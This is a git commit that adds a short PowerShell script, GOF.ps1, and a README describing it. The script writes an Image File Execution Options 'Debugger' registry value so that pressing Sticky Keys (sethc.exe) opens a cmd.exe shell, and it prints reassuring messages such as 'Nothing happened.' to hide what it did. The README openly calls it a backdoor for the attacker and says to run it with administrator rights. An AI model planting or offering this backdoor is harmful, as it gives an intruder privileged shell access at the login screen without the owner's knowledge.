34d34371319282cb963e7e139faaa070c8f03fbe
NaifABM <naifab7@gmail.com>
2023-02-15 15:51:10 -0500

    Adding my script

---
+++ GOF.ps1
@@ -0,0 +1,9 @@
+﻿$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\"
+$keyName = "sethc.exe" 
+$stringName = "Debugger"
+$binaryValue = "C:\Windows\System32\cmd.exe"
+
+write-host "Don't wory"
+New-Item -Path $registryPath -Name $keyName | Out-Null
+New-ItemProperty -Path ($registryPath + $keyName) -Name $stringName -Value $binaryValue | Out-Null
+write-host "Nothing happened."
--- README.md
+++ README.md
@@ -1,1 +1,11 @@
-# Scripts
+# GOF.ps1
+
+Description:
+
+	A Powershell script to replace the Sticky keys prompt with a System32 cmd shell
+that create a backdoor for the Attacker.
+
+Usage Instructions:
+
+	Run the script in Administration mode to achieve its purpose.
+      ./GOF.ps1
